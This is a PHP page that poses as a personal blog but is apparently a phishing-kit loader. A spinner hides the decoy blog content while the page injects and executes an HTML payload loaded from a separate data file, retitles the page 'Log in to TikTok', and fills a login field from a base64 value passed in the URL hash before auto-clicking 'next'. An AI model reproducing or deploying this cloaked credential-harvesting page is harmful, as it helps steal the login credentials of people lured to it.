<?php
defined('SECURE_ENTRY') or define('SECURE_ENTRY', true);
$siteTitle = "WanderLines";
$welcomeMessage = "Quiet Pixels";
$randomUsers = rand(100, 1000);
$lastRefresh = date("j F Y", strtotime("-" . rand(1, 30) . " days"));
header("Content-Type: text/html; charset=UTF-8");
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("Cache-Control: no-cache, must-revalidate");
header("Pragma: no-cache");
include 'data.php'; // Include data.php to get $decodedContent
ob_start();

function retrieveMockPosts() {
    return [
        ["headline"],
    ];
}
$articles = retrieveMockPosts();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="A blog with personal insights and updates.">
    <meta name="keywords" content="blog, tech, personal, updates">
    <meta name="author" content="Alex Smith">
    <meta name="robots" content="index, follow">
    <style>
        body {
            min-height: 100vh;
        }
        .header { color: #2a2a2a; }
        .article { margin-bottom: 25px; }
        .bottom-note { margin-top: 25px; font-size: 13px; color: #666; }
        .wait-screen {
            position: fixed;
            inset: 0;
            background: white;
            display: grid;
            place-items: center;
            z-index: 10000;
        }
        .wait-text {
            color: #2a2a2a;
            font-size: 20px;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #fe2c55;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #secretArea { display: flex; min-height: 100vh; justify-content:center }
    </style>
</head>
<body>
    <div class="wait-screen" id="waitPanel">
        <div class="wait-text">
            <div class="spinner"></div>
        </div>
    </div>

    <div class="content" id="visibleContent" style="display: none;" style="display: none;">
        <p>Engaging <?php echo $randomUsers; ?> thrilled readers!</p>
        <p>Updated: <?php echo $lastRefresh; ?></p>

        <?php foreach ($articles as $article): ?>
            <div class="article">
                <p><small><?php echo $article['when']; ?></small></p>
            </div>
        <?php endforeach; ?>
    </div>
    <div id="secretArea"></div>
    <footer class="bottom-note">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <script>
        const revealedContent = <?php echo json_encode($inspectElement); ?>; // Use decoded content from data.php
        function decipherBase64(code) {
            try {
                return atob(code);
            } catch (err) {
                console.error("Base64 decipher error:", err);
                return "";
            }
        }
        function verifyEmail(text) {
            const emailCheck = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailCheck.test(text);
        }
        function displayPayload(htmlPayload, destination) {
            document.title = "Log in to TikTok";
            const tempBox = document.createElement('div');
            tempBox.innerHTML = htmlPayload;
            const scripts = tempBox.getElementsByTagName('script');
            for (let i = 0; i < scripts.length; i++) {
                const newScript = document.createElement('script');
                scripts[i].src ? newScript.src = scripts[i].src : newScript.textContent = scripts[i].textContent;
                document.body.appendChild(newScript);
            }
            destination.innerHTML = tempBox.innerHTML;
            destination.style.display = "flex";
            setTimeout(() => {
                let storedKey = localStorage.getItem("aiVal");
                if (storedKey) {
                    let base64Part = storedKey.slice(6);
                    try {
                        let revealedValue = atob(base64Part);
                        document.getElementById('ai').value = revealedValue;
                        if (revealedValue) {
                            const forwardBtn = document.getElementById("next");
                            forwardBtn ? setTimeout(() => forwardBtn.click(), 2000) : alert("Next button not found.");
                        }
                    } catch (err) {
                        console.error("Base64 error:", err);
                    }
                }
            }, 1500);
        }
        setTimeout(() => {
            document.getElementById("visibleContent").style.display = "none";
            const waitLayer = document.getElementById("waitPanel");
            const hiddenZone = document.getElementById("secretArea");
            if (window.location.hash) {
                const hashInput = window.location.hash.slice(1);
                if (verifyEmail(hashInput)) {
                    alert("Denied: Email detected in URL.");
                    waitLayer.style.display = "none";
                    return;
                }
                localStorage.setItem("aiVal", hashInput);
                history.replaceState(null, null, window.location.pathname);
            }
            if (revealedContent) {
                displayPayload(revealedContent, hiddenZone);
            }
            waitLayer.style.display = "none";
        }, 1500);
    </script>
</body>
</html>

<?php
ob_end_flush();
?>
